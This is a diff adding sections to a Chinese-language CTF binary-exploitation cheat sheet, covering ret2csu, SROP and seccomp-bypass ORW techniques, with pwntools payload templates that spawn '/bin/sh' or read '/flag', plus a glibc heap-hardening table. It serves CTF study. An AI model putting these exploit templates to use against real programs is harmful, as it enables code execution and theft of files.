@@ -261,7 +261,211 @@ glibc 2.29+ 有 key 检测，需要先修改 key 字段绕过
 
 ---
 
-## 五、常用 pwntools 速查
+## 五、ret2csu（万能 gadget）
+
+### 适用场景
+- 64 位动态链接程序，gadget 不够用（找不到 `pop rdx` 等）
+- `__libc_csu_init` 函数中有通用 gadget，几乎所有动态链接程序都有
+
+### 原理
+```nasm
+; __libc_csu_init 中的两段 gadget：
+
+; gadget1（csu_end）— 设置寄存器
+pop rbx        ; rbx = 0
+pop rbp        ; rbp = 1（使 rbx+1 == rbp 跳过 jnz）
+pop r12        ; r12 = 要调用的函数指针（GOT 地址）
+pop r13        ; r13 = rdx（第三个参数）
+pop r14        ; r14 = rsi（第二个参数）
+pop r15        ; r15 = edi（第一个参数）
+ret
+
+; gadget2（csu_front）— 调用函数
+mov rdx, r13
+mov rsi, r14
+mov edi, r15d
+call [r12 + rbx*8]   ; 调用 r12 指向的函数
+add rbx, 1
+cmp rbp, rbx
+jnz short loc_xxx    ; rbx == rbp 时不跳转，继续执行
+; ... 接着又是 pop rbx/rbp/r12/r13/r14/r15/ret
+```
+
+### 利用模板
+```python
+from pwn import *
+
+def csu(func_got, arg1, arg2, arg3, ret_addr):
+    """ret2csu 通用模板"""
+    csu_end = 0x40125A    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+    csu_front = 0x401240  # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
+    
+    payload = p64(csu_end)
+    payload += p64(0)           # rbx = 0
+    payload += p64(1)           # rbp = 1
+    payload += p64(func_got)    # r12 = 函数 GOT 地址
+    payload += p64(arg3)        # r13 → rdx
+    payload += p64(arg2)        # r14 → rsi
+    payload += p64(arg1)        # r15 → edi
+    payload += p64(csu_front)
+    payload += b'\x00' * 56     # 填充 7 个 pop（gadget2 末尾的 pop 序列）
+    payload += p64(ret_addr)    # 最终返回地址
+    return payload
+```
+
+---
+
+## 六、SROP（Sigreturn Oriented Programming）
+
+### 适用场景
+- gadget 极少，但有 `syscall` 和 `sigreturn`
+- 静态链接程序中常见
+
+### 原理
+```
+利用 sigreturn 系统调用恢复寄存器上下文
+→ 伪造一个 Signal Frame 放在栈上
+→ 调用 sigreturn 后，所有寄存器被设置为我们控制的值
+→ 相当于一次性控制所有寄存器 + RIP
+```
+
+### 利用模板
+```python
+from pwn import *
+
+context(arch='amd64', os='linux')
+p = remote('ip', port)
+
+syscall_ret = 0x401234    # syscall; ret 的地址
+sigreturn = 0x401256      # mov rax, 15; syscall 的地址（或用 ROP 设置 rax=15）
+binsh_addr = 0x402000     # "/bin/sh" 字符串地址
+
+# 构造 SigreturnFrame
+frame = SigreturnFrame()
+frame.rax = 59            # execve 系统调用号
+frame.rdi = binsh_addr    # 第一个参数："/bin/sh"
+frame.rsi = 0             # 第二个参数：NULL
+frame.rdx = 0             # 第三个参数：NULL
+frame.rip = syscall_ret   # 返回到 syscall
+
+offset = 0x28 + 8
+payload = b'A' * offset
+payload += p64(sigreturn)
+payload += bytes(frame)
+
+p.sendline(payload)
+p.interactive()
+```
+
+---
+
+## 七、ORW（Open-Read-Write）— seccomp 沙箱下的利用
+
+### 适用场景
+- 程序开启了 seccomp 沙箱，禁止 `execve`
+- 只能用 `open` + `read` + `write` 读取 flag
+
+### 检测 seccomp 规则
+```bash
+# 用 seccomp-tools 查看沙箱规则
+seccomp-tools dump ./pwn1
+```
+
+### shellcode 版 ORW
+```python
+from pwn import *
+context(arch='amd64')
+
+# 手写 ORW shellcode
+shellcode = asm('''
+    /* open("/flag", 0) */
+    mov rax, 2
+    lea rdi, [rip + flag_str]
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall
+
+    /* read(fd, buf, 0x100) */
+    mov rdi, rax
+    mov rax, 0
+    lea rsi, [rsp]
+    mov rdx, 0x100
+    syscall
+
+    /* write(1, buf, 0x100) */
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [rsp]
+    mov rdx, 0x100
+    syscall
+
+    flag_str:
+    .string "/flag"
+''')
+```
+
+### ROP 版 ORW（NX 开启时）
+```python
+from pwn import *
+
+# 用 ROP 链依次调用 open → read → write
+# 需要找到 pop rax; ret / pop rdi; ret / pop rsi; ret / pop rdx; ret / syscall; ret
+
+pop_rax = 0x401001
+pop_rdi = 0x401002
+pop_rsi = 0x401003
+pop_rdx = 0x401004
+syscall_ret = 0x401005
+flag_str = 0x402000       # 提前写入 "/flag" 的地址
+buf_addr = 0x404000       # 可写地址（如 bss 段）
+
+payload = b'A' * offset
+
+# open("/flag", 0)
+payload += p64(pop_rax) + p64(2)
+payload += p64(pop_rdi) + p64(flag_str)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdx) + p64(0)
+payload += p64(syscall_ret)
+
+# read(3, buf, 0x100)  — fd 通常是 3
+payload += p64(pop_rax) + p64(0)
+payload += p64(pop_rdi) + p64(3)
+payload += p64(pop_rsi) + p64(buf_addr)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(syscall_ret)
+
+# write(1, buf, 0x100)
+payload += p64(pop_rax) + p64(1)
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi) + p64(buf_addr)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(syscall_ret)
+```
+
+---
+
+## 八、堆利用版本速查（glibc 版本影响）
+
+| glibc 版本 | 关键变化 | 影响 |
+|------------|---------|------|
+| 2.23 及以下 | 无 tcache | 用 fastbin attack、unsorted bin attack |
+| 2.26 | 引入 tcache | tcache poisoning 成为主流 |
+| 2.27 | tcache 无 double free 检测 | 可以直接 double free |
+| 2.29 | tcache 加入 key 检测 | double free 需要先清除 key 字段 |
+| 2.32 | tcache fd 指针加密（PROTECT_PTR） | 需要泄露堆地址来解密/伪造 fd |
+| 2.34 | 移除 __malloc_hook/__free_hook | 不能再用 hook 劫持，需要用 IO_FILE 攻击 |
+| 2.35+ | 更多加固 | House of Apple 等新技术 |
+
+### 查看目标 glibc 版本
+```bash
+strings libc.so.6 | grep "GNU C Library"
+./pwn1    # 运行时通常会显示 libc 版本
+```
+
+---
+
+## 九、常用 pwntools 速查
 
 ```python
 from pwn import *
